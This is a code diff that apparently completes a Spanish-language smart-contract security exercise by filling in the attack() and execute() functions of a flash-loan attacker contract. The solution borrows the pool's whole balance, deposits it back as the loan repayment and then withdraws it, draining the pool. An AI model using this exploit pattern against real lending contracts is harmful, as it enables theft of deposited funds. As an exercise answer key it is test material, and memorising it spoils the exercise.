@@ -11,6 +11,7 @@ interface IFlashLoanPool {
 }
 
 contract FlashLoanAttacker is Ownable {
+    using Address for address payable;
 
     IFlashLoanPool private immutable pool;
 
@@ -18,15 +19,14 @@ contract FlashLoanAttacker is Ownable {
         pool = IFlashLoanPool(poolAddress);
     }
 
-    function attack() external onlyOwner {
-        // COMPLETAR
-        // ¿Cómo iniciamos el ataque?
-        // ¿Tal vez por el flash loan? ¿Y luego?
+    function attack() external payable onlyOwner {
+        pool.flashLoan(address(pool).balance);
+
+        pool.withdraw();
     }
 
     function execute() external payable {
-        // COMPLETAR
-        // Si pedimos un flash loan, ¿qué hacemos con los ETH que llegan a esta función?
+        IFlashLoanPool(msg.sender).deposit{value: msg.value}();
     }
 
     receive () external payable {}
